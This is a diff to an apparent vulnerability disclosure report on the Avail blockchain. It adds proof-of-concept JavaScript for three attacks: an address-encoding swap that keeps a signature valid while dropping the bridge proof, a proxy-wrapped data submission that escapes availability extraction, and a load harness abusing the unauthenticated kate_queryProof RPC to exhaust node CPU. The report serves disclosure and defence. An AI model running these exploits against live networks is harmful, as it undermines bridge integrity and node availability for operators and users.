@@ -276,6 +276,32 @@ node poc_multiaddr_index.js
 # first as Address::Id (baseline), then as Address::Index(0) (attack)
 ```
 
+### PoC Code
+
+The step unique to this finding is rewriting the signed extrinsic's address bytes from `Id` to `Index` after signing; the SCALE signing payload excludes the address, so the signature stays valid. Full script: `avail/poc/poc_multiaddr_index.js`.
+
+```javascript
+// Rewrite a signed Address::Id extrinsic to Address::Index(n).
+// MultiAddress::Id = 0x00 + 32 bytes; Index = 0x01 + compact<u32>.
+function swapAddressToIndex(signedHex, accountIndex) {
+  const bytes = hexToU8a(signedHex);
+  let prefixLen = 1;                            // compact length prefix (1-4 bytes)
+  const mode = bytes[0] & 0x03;
+  if (mode === 0x01) prefixLen = 2;
+  else if (mode === 0x02) prefixLen = 4;
+  const idAddrLen = 33;                         // 0x00 + 32-byte AccountId
+  const indexAddr = new Uint8Array([0x01, ...compactToU8a(accountIndex)]);
+  const body = new Uint8Array([
+    bytes[prefixLen],                           // version byte 0x84
+    ...indexAddr,                               // Index address replaces Id address
+    ...bytes.slice(prefixLen + 1 + idAddrLen),  // sig + extra + call, unchanged
+  ]);
+  return u8aToHex(new Uint8Array([...compactToU8a(body.length), ...body]));
+}
+// baseline: sign as Address::Id  -> author_submitExtrinsic -> bridge proof exists
+// attack:   swapAddressToIndex(hex, 0) -> author_submitExtrinsic -> proof missing
+```
+
 ### Raw Output
 
 ```text
@@ -322,6 +348,21 @@ A `DataAvailability::submit_data` wrapped in `Proxy::proxy` (AppId 0) was reprod
 ```bash
 node run_poc.js
 # baseline: direct submitData; attack: Bob.proxy.proxy(real=Alice, submitData) with AppId=0
+```
+
+### PoC Code
+
+Full script: `avail/poc/run_poc.js`. The negative `send_message` case is `avail/poc/poc_bridge1_proxy_sendmessage.js`.
+
+```javascript
+// baseline: data is extracted into the Kate grid
+const baseline = api.tx.dataAvailability.submitData("0x42415345");
+await submitAndWait(api, baseline, alice);    // DataSubmitted + kate_queryDataProof OK
+
+// attack: same call wrapped in Proxy::proxy (AppId 0) is dropped from DA extraction
+const inner  = api.tx.dataAvailability.submitData("0x424f4e4441");
+const attack = api.tx.proxy.proxy(alice.address, null, inner);
+await submitAndWait(api, attack, bob);        // DataSubmitted YES, kate_queryDataProof FAILS
 ```
 
 ### Raw Output
@@ -396,6 +437,27 @@ curl -s -d '{"jsonrpc":"2.0","id":1,"method":"kate_blockLength","params":[]}' \
   -H "Content-Type: application/json" https://mainnet-rpc.avail.so/rpc
 # -> {"max":[4194304,4194304,4194304],"cols":512,"rows":256,"chunkSize":32}
 # kate_queryProof is exposed without authentication on mainnet
+```
+
+### PoC Code
+
+Full scripts: `avail/poc/avl03/`. `harness.mjs` is the load driver (single / conc / latency modes); `m1.sh` attaches `perf` to the node process for the core-seconds measurement.
+
+```javascript
+// harness.mjs (single mode): tight 1-cell loop, cell randomized each iteration to defeat caching
+while (Date.now() < end) {
+  const cc = cells.map(x => ({ row: (x.row + k) % 256, col: (x.col + k * 3) % 512 }));
+  const t = process.hrtime.bigint();
+  await rpc('kate_queryProof', [cc, blockHash]);   // forces a full grid rebuild server-side
+  lat.push(Number(process.hrtime.bigint() - t) / 1e6);
+  k++;
+}
+```
+
+```bash
+# m1.sh: core-seconds for one 1-cell queryProof, via perf task-clock
+node harness.mjs single $H 1 25 > m1_loop.json &
+sudo perf stat -e task-clock,cycles,instructions -p $(pgrep -f 'avail-node --dev') -- sleep 25
 ```
 
 ### M1 — Core-seconds per request (4 MB block, perf)
